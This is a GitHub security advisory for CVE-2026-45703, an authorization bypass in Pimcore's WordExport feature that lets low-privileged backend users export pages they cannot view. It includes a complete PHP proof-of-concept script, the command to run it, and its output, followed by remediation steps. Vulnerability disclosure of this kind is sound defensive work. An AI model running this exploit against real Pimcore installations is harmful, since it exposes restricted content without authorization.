# [M] Pimcore has a WordExport Authorization Bypass for Unauthorized Document Export

## Summary
Severity: Medium
Advisory: GHSA-332x-r494-54fq
CVE: CVE-2026-45703
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-332x-r494-54fq
Type: github-advisory

## Affected
- Packagist: `pimcore/pimcore` — affected >=12.0.0-RC1 <12.3.7
- Packagist: `pimcore/pimcore` — affected >=0 <11.5.17
- Packagist: `pimcore/pimcore` — affected >=2026.1.0 <2026.1.3

## Details
### Summary

The `WordExport` export flow only checks whether the current backend user has the feature permission `word_export`. It does not verify access rights on the target element itself.  
As a result, a low-privileged backend user can export document content even when the user does not have `view` permission on that document.

In the local Docker reproduction, a low-privileged user successfully exported sensitive content from a page the user was not allowed to view:

- `POC-WORDEXPORT-TITLE`
- `POC-WORDEXPORT-DESC`

### Root Cause

The controller only performs a feature-level permission check before starting the export flow:

- [[TranslationController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L41)](pimcore-12.3.3/bundles/WordExportBundle/src/Controller/[TranslationController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L44)#L41)
- [TranslationController.php](pimcore-12.3.3/bundles/WordExportBundle/src/Controller/[TranslationController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L56)#L44)

It then directly resolves the target element from attacker-controlled `type/id` input:

- [[TranslationController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L58)](pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L56)
- [[TranslationController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L72)](pimcore-12.3.3/bundles/WordExportBundle/src/Controller/[TranslationController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L113)#L58)

For document-like elements such as `Page` and `Snippet`, it renders content in an admin context:

- [[TranslationController.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L114)](pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L72)
- [TranslationController.php](pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L113)
- [TranslationController.php](pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L114)

No object-level authorization check such as `isAllowed('view')` is enforced on the target element.

### Affected Scope

Based on the source code, the following element types may be affected:

- `page`
- `snippet`
- `email`
- `object`

For page-like documents, the `pimcore_admin = true` rendering context may expose additional backend-visible content.

### Preconditions

- The attacker is an authenticated backend user
- The attacker has the `word_export` permission
- The attacker does not have `view` permission on the target document

### Reproduction Environment

- Reproduction root: `pimcore-12.3.3-repro`
- Standalone PoC script: [[poc_wordexport.php](https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3-repro/tools/poc_wordexport.php)](pimcore-12.3.3-repro/tools/poc_wordexport.php)

```php
<?php
declare(strict_types=1);

use Pimcore\Bundle\WordExportBundle\Controller\TranslationController as WordExportController;
use Pimcore\Controller\UserAwareController;
use Pimcore\Model\Document\Page;
use Pimcore\Model\User;
use Pimcore\Security\User\TokenStorageUserResolver;
use Pimcore\Security\User\User as SecurityUser;
use Pimcore\Serializer\Serializer as PimcoreSerializer;
use Pimcore\Tool\Authentication;
use Symfony\Component\DependencyInjection\ContainerInterface;
use Symfony\Component\Filesystem\Filesystem;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
use Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorage;

require dirname(__DIR__) . '/vendor/autoload.php';

define('PIMCORE_PROJECT_ROOT', dirname(__DIR__));

try {
    \Pimcore\Bootstrap::bootstrap();

    $kernel = new \App\Kernel('dev', true);
    \Pimcore::setKernel($kernel);
    $kernel->boot();

    $container = $kernel->getContainer();

    /** @var RequestStack $requestStack */
    $requestStack = getService($container, [
        RequestStack::class,
        'request_stack',
    ]);

    $admin = User::getByName('admin');
    if (!$admin instanceof User) {
        fail('admin user is missing');
    }

    $auditor = User::getByName('auditor_wordexport');
    if (!$auditor instanceof User) {
        $auditor = new User();
        $auditor->setParentId(0);
        $auditor->setName('auditor_wordexport');
    }

    $auditor->setAdmin(false);
    $auditor->setActive(true);
    $auditor->setPassword(Authentication::getPasswordHash('auditor_wordexport', 'auditor-pass'));
    $auditor->setPermissions(['word_export']);
    $auditor->setRoles([]);
    $auditor->setWorkspacesDocument([]);
    $auditor->setWorkspacesAsset([]);
    $auditor->setWorkspacesObject([]);
    $auditor->save();

    $page = Page::getByPath('/poc-wordexport-secret-page');
    if (!$page instanceof Page) {
        $page = new Page();
        $page->setParentId(1);
        $page->setKey('poc-wordexport-secret-page');
    }

    $page->setPublished(true);
    $page->setController('App\\Controller\\DefaultController::defaultAction');
    $page->setTemplate('default/default.html.twig');
    $page->setTitle('POC-WORDEXPORT-TITLE');
    $page->setDescription('POC-WORDEXPORT-DESC');
    $page->setProperty('language', 'text', 'en', false, true);
    $page->setUserOwner($admin->getId());
    $page->setUserModification($admin->getId());
    $page->save();

    $canViewPage = $page->getDao()->isAllowed('view', $auditor);

    $tokenResolver = buildTokenResolver($auditor);
    $controller = wireController(new WordExportController(), $container, $tokenResolver);

    $exportId = 'wordexportpoc1';
    $exportRequest = new Request([], [
        'id' => $exportId,
        'data' => json_encode([
            ['type' => 'document', 'id' => $page->getId()],
        ], JSON_THROW_ON_ERROR),
        'source' => 'en',
    ]);

    $requestStack->push($exportRequest);
    $controller->wordExportAction($exportRequest, new Filesystem());
    $requestStack->pop();

    $downloadRequest = new Request(['id' => $exportId]);
    $requestStack->push($downloadRequest);
    $downloadResponse = $controller->wordExportDownloadAction($downloadRequest);
    $requestStack->pop();

    $wordContent = (string) $downloadResponse->getContent();

    echo json_encode([
        'vulnerability' => 'wordexport_authorization_bypass',
        'user' => [
            'id' => $auditor->getId(),
            'name' => $auditor->getName(),
            'permissions' => $auditor->getPermissions(),
        ],
        'target_page' => [
            'id' => $page->getId(),
            'path' => $page->getFullPath(),
            'title' => $page->getTitle(),
            'description' => $page->getDescription(),
            'user_can_view_page' => $canViewPage,
        ],
        'result' => [
            'download_contains_title' => str_contains($wordContent, 'POC-WORDEXPORT-TITLE'),
            'download_contains_description' => str_contains($wordContent, 'POC-WORDEXPORT-DESC'),
        ],
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), PHP_EOL;
} catch (Throwable $e) {
    fail(sprintf(
        '%s: %s in %s:%d%s',
        $e::class,
        $e->getMessage(),
        $e->getFile(),
        $e->getLine(),
        $e->getTraceAsString() ? PHP_EOL . $e->getTraceAsString() : ''
    ));
}

function wireController(
    UserAwareController $controller,
    ContainerInterface $container,
    TokenStorageUserResolver $tokenResolver
): UserAwareController
{
    $controller->setContainer($container);
    $controller->setTokenResolver($tokenResolver);

    if (method_exists($controller, 'setPimcoreSerializer')) {
        /** @var PimcoreSerializer $serializer */
        $serializer = getService($container, [
            PimcoreSerializer::class,
            'Pimcore\\Serializer\\Serializer',
        ]);
        $controller->setPimcoreSerializer($serializer);
    }

    return $controller;
}

function buildTokenResolver(User $user): TokenStorageUserResolver
{
    $tokenStorage = new TokenStorage();
    $proxyUser = new SecurityUser($user);
    $token = new UsernamePasswordToken($proxyUser, 'pimcore_admin', $proxyUser->getRoles());
    $tokenStorage->setToken($token);

    return new TokenStorageUserResolver($tokenStorage);
}

function getService(ContainerInterface $container, array $ids): mixed
{
    foreach ($ids as $id) {
        try {
            if ($container->has($id)) {
                return $container->get($id);
            }
        } catch (Throwable) {
        }
    }

    fail('Unable to resolve service: ' . implode(', ', $ids));
}

function fail(string $message): never
{
    fwrite(STDERR, $message . PHP_EOL);
    exit(1);
}

```



### Reproduction Steps

1. Create a low-privileged user named `auditor_wordexport` with only the `word_export` permission and no document workspace permissions.
2. Create a test page at `/poc-wordexport-secret-page` containing sensitive values:
   - `title = POC-WORDEXPORT-TITLE`
   - `description = POC-WORDEXPORT-DESC`
3. Verify that the user does not have `view` permission on that page.
4. Execute `wordExportAction()` and `wordExportDownloadAction()` as that user.
5. Check whether the exported HTML contains the sensitive values.

Reproduction command:

```bash
cd pimcore-12.3.3-repro
docker compose exec -T php php tools/poc_wordexport.php
```

### Reproduction Result

Relevant PoC output:

```json
{
  "vulnerability": "wordexport_authorization_bypass",
  "user": {
    "name": "auditor_wordexport",
    "permissions": [
      "word_export"
    ]
  },
  "target_page": {
    "path": "/poc-wordexport-secret-page",
    "title": "POC-WORDEXPORT-TITLE",
    "description": "POC-WORDEXPORT-DESC",
    "user_can_view_page": false
  },
  "result": {
    "download_contains_title": true,
    "download_contains_description": true
  }
}
```

This shows that:

- The user cannot view the target page
- The exported file still contains the page's sensitive content

This confirms that the issue is practically exploitable.

### Security Impact

- Unauthorized disclosure of structured page fields
- Unauthorized export of restricted backend content
- Potential exposure of unpublished or otherwise restricted content
- Lateral data access by low-privileged backend accounts

### Remediation

1. Perform object-level authorization immediately after resolving the element from `type/id`.
2. Require at least `view` permission on the target element.
3. Apply consistent authorization checks across `page`, `snippet`, `email`, and `object`.
4. Bind export creation and export download to the requesting user or an equivalent authorization context.
5. Add regression tests to ensure that users with `word_export` but without element `view` permission cannot export content.

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-332x-r494-54fq
- https://github.com/pimcore/pimcore/pull/19112
- https://github.com/pimcore/pimcore/commit/0ce2232b6f92c79d0ac244e95e21f55c37456ef1
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/pimcore/releases/tag/v12.3.7
